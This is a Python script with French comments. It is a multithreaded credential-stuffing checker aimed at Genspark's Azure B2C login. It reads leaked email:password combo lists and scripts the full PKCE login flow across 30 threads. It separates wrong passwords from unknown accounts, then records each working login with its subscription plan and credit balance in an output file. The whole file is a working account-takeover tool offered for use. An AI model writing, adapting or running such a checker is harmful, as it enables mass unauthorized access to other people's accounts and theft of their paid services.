import requests
import re
import json
import os
import threading
import hashlib
import base64
import secrets
from queue import Queue
from time import sleep

# --- VARIABLES DE CONFIGURATION ---
NUM_THREADS = 30
COMBO_FILE = "combo.txt"
VALID_ACCOUNTS_FILE = "comptes_valides.txt"
INVALID_ACCOUNTS_FILE = "comptes_invalides.txt"

# --- Définition des couleurs pour le terminal ---
class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    RESET   = '\033[0m'

# Lock pour synchroniser l'accès aux fichiers et aux compteurs
file_lock   = threading.Lock()
combo_queue = Queue()

# --- Compteurs pour le suivi de la progression ---
checked_count  = 0
valid_count    = 0
total_accounts = 0

# --- URLs APIs Genspark ---
USER_URL    = "https://www.genspark.ai/api/user"
BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"


def generate_pkce():
    """
    Génère un couple (code_verifier, code_challenge) PKCE valide.
    code_verifier = 43 caractères aléatoires URL-safe
    code_challenge = base64url(sha256(code_verifier))
    """
    code_verifier = secrets.token_urlsafe(32)  # 43 chars
    digest = hashlib.sha256(code_verifier.encode('ascii')).digest()
    code_challenge = base64.urlsafe_b64encode(digest).rstrip(b'=').decode('ascii')
    return code_verifier, code_challenge


def get_plan_and_balance(session):
    """
    Appelle les deux APIs Genspark après connexion réussie.
    La session contient déjà le cookie session_id valide.
    """
    info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}

    # 1. GET /api/user → plan + interval
    try:
        r = session.get(USER_URL, timeout=10)
        if r.status_code == 200:
            data = r.json()
            # L'API renvoie directement les champs au niveau racine
            info['plan']     = data.get("personal_plan") or \
                               data.get("data", {}).get("personal_plan") or "N/A"
            info['interval'] = data.get("personal_paid_sub_interval") or \
                               data.get("data", {}).get("personal_paid_sub_interval") or "N/A"
    except Exception:
        pass

    # 2. GET /api/payment/get_credit_balance → balance
    try:
        r = session.get(BALANCE_URL, timeout=10)
        if r.status_code == 200:
            data    = r.json()
            # {"status":0,"message":"success","data":{"balance":9717}}
            balance = data.get("data", {}).get("balance")
            if balance is not None:
                info['balance'] = str(balance)
    except Exception:
        pass

    return info


def check_account(email, password):
    """
    Connexion complète via Azure B2C avec PKCE correct :

    Étape 1 : GET  /authorize          → génère PKCE + récupère csrf + transId
    Étape 2 : POST /SelfAsserted        → soumet email + password
    Étape 3 : GET  /confirmed           → redirige vers genspark.ai/api/auth?code=
    Étape 4 : GET  /api/auth?code=...   → envoie le code_verifier comme cookie
                                          → reçoit session_id valide

    Retourne ('SUCCESS', session) ou ('CODE_ERREUR', None).
    """
    session = requests.Session()
    session.headers.update({
        'User-Agent': (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/124.0.0.0 Safari/537.36'
        ),
        'Accept-Language': 'en-US,en;q=0.9',
    })

    try:
        # ── Étape 1 : authorize + génération PKCE ────────────────────────
        code_verifier, code_challenge = generate_pkce()
        nonce = secrets.token_hex(32)
        state = secrets.token_urlsafe(12)

        start_url = (
            "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
            "b2c_1_new_login/oauth2/v2.0/authorize"
            "?client_id=536a4e98-fd24-4cbc-a67b-417e209e0080"
            "&response_type=code"
            "&redirect_uri=https%3A%2F%2Fwww.genspark.ai%2Fapi%2Fauth"
            "&scope=email+offline_access+openid+profile"
            f"&state={state}"
            f"&code_challenge={code_challenge}"
            "&code_challenge_method=S256"
            f"&nonce={nonce}"
            "&client_info=1&prompt=login"
        )
        r1 = session.get(start_url, timeout=15)

        settings_match = re.search(r'var SETTINGS = ({.*?});', r1.text, re.DOTALL)
        if not settings_match:
            return 'ERROR_SETTINGS', None

        settings_data  = json.loads(settings_match.group(1))
        csrf_token     = settings_data['csrf']
        transaction_id = settings_data['transId']

        # ── Étape 2 : SelfAsserted POST ───────────────────────────────────
        login_post_url = (
            "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
            "B2C_1_new_login/SelfAsserted"
        )
        query_params = {'tx': transaction_id, 'p': 'B2C_1_new_login'}
        payload      = {'request_type': 'RESPONSE', 'email': email, 'password': password}
        post_headers = {
            'x-csrf-token'    : csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin'          : 'https://login.genspark.ai',
            'Referer'         : r1.url,
        }

        r2 = session.post(
            login_post_url,
            params=query_params,
            headers=post_headers,
            data=payload,
            timeout=15
        )

        if r2.status_code != 200:
            return 'ERROR_UNEXPECTED_RESPONSE', None

        r2_data = r2.json()

        # Détection d'erreur via le body JSON de SelfAsserted
        if r2_data.get("status") == "400":
            message = r2_data.get("message", "")
            if "Your password is incorrect" in message or "incorrect" in message.lower():
                return 'WRONG_PASSWORD', None
            if "We can't seem to find your account" in message or "find your account" in message.lower():
                return 'ACCOUNT_NOT_FOUND', None
            return 'ERROR_API', None

        if r2_data.get("status") != "200":
            return 'ERROR_API', None

        # ── Étape 3 : confirmed → hop 1 → /api/auth?code= ────────────────
        confirm_url = (
            "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
            "B2C_1_new_login/api/CombinedSigninAndSignup/confirmed"
            f"?rememberMe=false&csrf_token={csrf_token}"
            f"&tx={transaction_id}&p=B2C_1_new_login"
        )

        # NE PAS suivre les redirections : on veut lire hop1_location
        hop1 = session.get(confirm_url, timeout=15, allow_redirects=False)
        hop1_location = hop1.headers.get('location', '')

        # Si l'URL de redirection contient 'error=' → login invalide
        if 'error=' in hop1_location:
            if 'AADB2C90053' in hop1_location:
                return 'ACCOUNT_NOT_FOUND', None
            return 'INVALID', None

        # Si l'URL ne contient pas 'code=' → problème inattendu
        if 'code=' not in hop1_location:
            return 'ERROR_NO_CODE', None

        # ── Étape 4 : GET /api/auth?code=... avec code_verifier ───────────
        # Le serveur Genspark attend le code_verifier dans un cookie
        # pour valider l'échange PKCE et poser le session_id
        session.cookies.set('pkce_code_verifier', code_verifier, domain='www.genspark.ai')

        hop2 = session.get(hop1_location, timeout=15, allow_redirects=False)

        # Après hop2, session_id doit être posé sur www.genspark.ai
        if 'session_id' not in session.cookies:
            # Parfois hop2 renvoie un 307 vers / et le cookie est posé là
            # On ne suit PAS la redirection vers / (inutile)
            # Si toujours pas de session_id, c'est un échec
            return 'ERROR_NO_SESSION', None

        # Mettre à jour les headers pour les appels API suivants
        session.headers.update({
            'Referer': 'https://www.genspark.ai/',
            'Origin' : 'https://www.genspark.ai',
        })

        return 'SUCCESS', session

    except (requests.exceptions.RequestException, json.JSONDecodeError, KeyError):
        return 'ERROR_NETWORK_OR_PARSE', None


def worker():
    """Vérifie un compte, récupère plan + balance si valide, affiche le statut."""
    global checked_count, valid_count, total_accounts

    while not combo_queue.empty():
        try:
            line = combo_queue.get_nowait()
        except Exception:
            break

        line = line.strip()
        if not line or ':' not in line:
            combo_queue.task_done()
            continue

        email, password = line.split(':', 1)

        result_code, session = check_account(email, password)

        with file_lock:
            checked_count += 1

            if result_code == 'SUCCESS':
                valid_count += 1

                # ── Récupération du plan et du solde ──────────────────────
                info     = get_plan_and_balance(session)
                plan     = info['plan']
                interval = info['interval']
                balance  = info['balance']

                # Ligne sauvegardée dans comptes_valides.txt
                save_line = (
                    f"{line} | "
                    f"Plan: {plan} | "
                    f"Interval: {interval} | "
                    f"Balance: {balance}"
                )
                with open(VALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f_out:
                    f_out.write(save_line + "\n")

                # Couleur selon le plan
                if plan and plan.lower() == 'pro':
                    plan_color = Colors.MAGENTA
                elif plan and plan.lower() == 'plus':
                    plan_color = Colors.GREEN
                else:
                    plan_color = Colors.YELLOW

                message = (
                    f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
                    f"Plan: {plan_color}{plan.upper() if plan != 'N/A' else 'N/A'}{Colors.RESET} | "
                    f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
                    f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
                )

            else:
                if result_code == 'WRONG_PASSWORD':
                    error_msg = "Mot de passe incorrect"
                elif result_code in ('ACCOUNT_NOT_FOUND', 'INVALID'):
                    error_msg = "Compte introuvable"
                else:
                    error_msg = f"Erreur ({result_code})"

                message = f"{Colors.RED}{error_msg}{Colors.RESET}"
                with open(INVALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f_out:
                    f_out.write(line + "\n")

            status_line = f"[{checked_count}/{total_accounts}] [Valides: {valid_count}]"
            print(f"{status_line} {line}  ->  {message}")

        combo_queue.task_done()


# --- Point d'entrée principal du script ---
if __name__ == "__main__":
    if not os.path.exists(COMBO_FILE):
        print(f"{Colors.RED}ERREUR : Le fichier '{COMBO_FILE}' est introuvable.{Colors.RESET}")
        exit()

    open(VALID_ACCOUNTS_FILE, 'w').close()
    open(INVALID_ACCOUNTS_FILE, 'w').close()

    with open(COMBO_FILE, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if ':' in line.strip()]
        for line in lines:
            combo_queue.put(line)

    total_accounts = len(lines)

    if total_accounts == 0:
        print(f"{Colors.YELLOW}Le fichier '{COMBO_FILE}' est vide ou mal formaté.{Colors.RESET}")
        exit()

    print(f"--- Lancement de la vérification de {total_accounts} comptes avec {NUM_THREADS} threads ---")

    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        threads.append(thread)

    combo_queue.join()

    print(f"\n--- Vérification terminée ---")
    invalid_count = total_accounts - valid_count
    print(f"Résultats: {valid_count} valides, {invalid_count} invalides sur {total_accounts} comptes vérifiés.")
    print(f"{Colors.GREEN}Les comptes valides ont été sauvegardés dans '{VALID_ACCOUNTS_FILE}'.{Colors.RESET}")
    print(f"{Colors.RED}Les comptes invalides ont été sauvegardés dans '{INVALID_ACCOUNTS_FILE}'.{Colors.RESET}")
